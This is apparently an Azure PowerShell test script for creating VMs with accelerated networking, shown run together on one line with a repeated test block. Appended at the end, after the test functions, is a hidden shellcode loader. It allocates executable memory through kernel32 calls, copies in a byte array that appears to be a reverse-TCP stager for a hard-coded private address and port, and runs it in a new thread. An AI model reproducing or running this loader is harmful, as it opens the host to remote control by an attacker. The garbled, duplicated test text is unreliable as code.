2;Assert-AreEqual $p.StorageProfile.DataDisks[1].Vhd.Uri $dataDiskVhdUri2;$user = "Foo12";$password = $PLACEHOLDER;$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$cred = New-Object System.Management.Automation.PSCredential ($user, $securePassword);$computerName = 'test';$vhdContainer = "https://$stoname.blob.core.windows.net/test";$img = 'a699494373c04fc0bc8f2bb1389d6106__Windows-Server-2012-Datacenter-201503.01-en.us-127GB.vhd';$p = Set-AzureRmVMOperatingSystem -VM $p -Windows -ComputerName $computerName -Credential $cred;Assert-AreEqual $p.OSProfile.AdminUsername $user;Assert-AreEqual $p.OSProfile.ComputerName $computerName;Assert-AreEqual $p.OSProfile.AdminPassword $password;$imgRef = Get-DefaultCRPImage "westcentralus" "MicrosoftWindowsServer";$p = ($imgRef | Set-AzureRmVMSourceImage -VM $p);Assert-NotNull $p.StorageProfile.ImageReference;Assert-Null $p.StorageProfile.SourceImageId;$p.StorageProfile.DataDisks = $null;New-AzureRmVM -ResourceGroupName $rgname -Location $loc -VM $p;$vm1 = Get-AzureRmVM -Name $vmname -ResourceGroupName $rgname;Assert-AreEqual $vm1.Name $vmname;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces[0].Id $nicId;$getnic = Get-AzureRmNetworkInterface -Name ('nic' + $rgname) -ResourceGroupName $rgname;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces[0].Id $getnic.Id;Assert-AreEqual $getnic.EnableAcceleratedNetworking $trueRemove-AzureRmVM -Name $vmname -ResourceGroupName $rgname -Force;}finally{Clean-ResourceGroup $rgname}}function Test-VMNicWithAcceleratedNetworkingValidations{$rgname = Get-ComputeTestResourceNametry{$loc = "WestCentralUS";New-AzureRmResourceGroup -Name $rgname -Location $loc -Force;$vmsize = 'Standard_DS15_v2';$vmname = 'vm' + $rgname;$p = New-AzureRmVMConfig -VMName $vmname -VMSize $vmsize;Assert-AreEqual $p.HardwareProfile.VmSize $vmsize;$subnet = New-AzureRmVirtualNetworkSubnetConfig -Name ('subnet' + $rgname) -AddressPrefix "10.0.0.0/24";$vnet = New-AzureRmVirtualNetwork -Force -Name ('vnet' + $rgname) -ResourceGroupName $rgname -Location $loc -AddressPrefix "10.0.0.0/16" -Subnet $subnet;$vnet = Get-AzureRmVirtualNetwork -Name ('vnet' + $rgname) -ResourceGroupName $rgname;$subnetId = $vnet.Subnets[0].Id;$pubip = New-AzureRmPublicIpAddress -Force -Name ('pubip' + $rgname) -ResourceGroupName $rgname -Location $loc -AllocationMethod Dynamic -DomainNameLabel ('pubip' + $rgname);$pubip = Get-AzureRmPublicIpAddress -Name ('pubip' + $rgname) -ResourceGroupName $rgname;$pubipId = $pubip.Id;$nic = New-AzureRmNetworkInterface -Force -Name ('nic' + $rgname) -ResourceGroupName $rgname -Location $loc -EnableAcceleratedNetworking -SubnetId $subnetId -PublicIpAddressId $pubip.Id;$nic = Get-AzureRmNetworkInterface -Name ('nic' + $rgname) -ResourceGroupName $rgname;$nicId = $nic.Id;Assert-AreEqual $nic.EnableAcceleratedNetworking $true$p = Add-AzureRmVMNetworkInterface -VM $p -Id $nicId;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $p.NetworkProfile.NetworkInterfaces[0].Id $nicId;Assert-Null $p.NetworkProfile.NetworkInterfaces[0].Primary;$stoname = 'sto' + $rgname;$stotype = 'Standard_GRS';New-AzureRmStorageAccount -ResourceGroupName $rgname -Name $stoname -Location $loc -Type $stotype;$stoaccount = Get-AzureRmStorageAccount -ResourceGroupName $rgname -Name $stoname;$osDiskName = 'osDisk';$osDiskCaching = 'ReadWrite';$osDiskVhdUri = "https://$stoname.blob.core.windows.net/test/os.vhd";$dataDiskVhdUri1 = "https://$stoname.blob.core.windows.net/test/data1.vhd";$dataDiskVhdUri2 = "https://$stoname.blob.core.windows.net/test/data2.vhd";$dataDiskVhdUri3 = "https://$stoname.blob.core.windows.net/test/data3.vhd";$p = Set-AzureRmVMOSDisk -VM $p -Name $osDiskName -VhdUri $osDiskVhdUri -Caching $osDiskCaching -CreateOption FromImage;$p = Add-AzureRmVMDataDisk -VM $p -Name 'testDataDisk1' -Caching 'ReadOnly' -DiskSizeInGB 10 -Lun 1 -VhdUri $dataDiskVhdUri1 -CreateOption Empty;$p = Add-AzureRmVMDataDisk -VM $p -Name 'testDataDisk2' -Caching 'ReadOnly' -DiskSizeInGB 11 -Lun 2 -VhdUri $dataDiskVhdUri2 -CreateOption Empty;$p = Add-AzureRmVMDataDisk -VM $p -Name 'testDataDisk3' -Caching 'ReadOnly' -DiskSizeInGB 12 -Lun 3 -VhdUri $dataDiskVhdUri3 -CreateOption Empty;$p = Remove-AzureRmVMDataDisk -VM $p -Name 'testDataDisk3';Assert-AreEqual $p.StorageProfile.OSDisk.Caching $osDiskCaching;Assert-AreEqual $p.StorageProfile.OSDisk.Name $osDiskName;Assert-AreEqual $p.StorageProfile.OSDisk.Vhd.Uri $osDiskVhdUri;Assert-AreEqual $p.StorageProfile.DataDisks.Count 2;Assert-AreEqual $p.StorageProfile.DataDisks[0].Caching 'ReadOnly';Assert-AreEqual $p.StorageProfile.DataDisks[0].DiskSizeGB 10;Assert-AreEqual $p.StorageProfile.DataDisks[0].Lun 1;Assert-AreEqual $p.StorageProfile.DataDisks[0].Vhd.Uri $dataDiskVhdUri1;Assert-AreEqual $p.StorageProfile.DataDisks[1].Caching 'ReadOnly';Assert-AreEqual $p.StorageProfile.DataDisks[1].DiskSizeGB 11;Assert-AreEqual $p.StorageProfile.DataDisks[1].Lun 2;Assert-AreEqual $p.StorageProfile.DataDisks[1].Vhd.Uri $dataDiskVhdUri2;$user = "Foo12";$password = $PLACEHOLDER;$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$cred = New-Object System.Management.Automation.PSCredential ($user, $securePassword);$computerName = 'test';$vhdContainer = "https://$stoname.blob.core.windows.net/test";$img = 'a699494373c04fc0bc8f2bb1389d6106__Windows-Server-2012-Datacenter-201503.01-en.us-127GB.vhd';$p = Set-AzureRmVMOperatingSystem -VM $p -Windows -ComputerName $computerName -Credential $cred;Assert-AreEqual $p.OSProfile.AdminUsername $user;Assert-AreEqual $p.OSProfile.ComputerName $computerName;Assert-AreEqual $p.OSProfile.AdminPassword $password;$imgRef = Get-DefaultCRPImage "westcentralus" "MicrosoftWindowsServer";$p = ($imgRef | Set-AzureRmVMSourceImage -VM $p);Assert-NotNull $p.StorageProfile.ImageReference;Assert-Null $p.StorageProfile.SourceImageId;$p.StorageProfile.DataDisks = $null;New-AzureRmVM -ResourceGroupName $rgname -Location $loc -VM $p;$vm1 = Get-AzureRmVM -Name $vmname -ResourceGroupName $rgname;Assert-AreEqual $vm1.Name $vmname;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces.Count 1;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces[0].Id $nicId;$getnic = Get-AzureRmNetworkInterface -Name ('nic' + $rgname) -ResourceGroupName $rgname;Assert-AreEqual $vm1.NetworkProfile.NetworkInterfaces[0].Id $getnic.Id;Assert-AreEqual $getnic.EnableAcceleratedNetworking $trueRemove-AzureRmVM -Name $vmname -ResourceGroupName $rgname -Force;}finally{Clean-ResourceGroup $rgname}}$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x0f,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};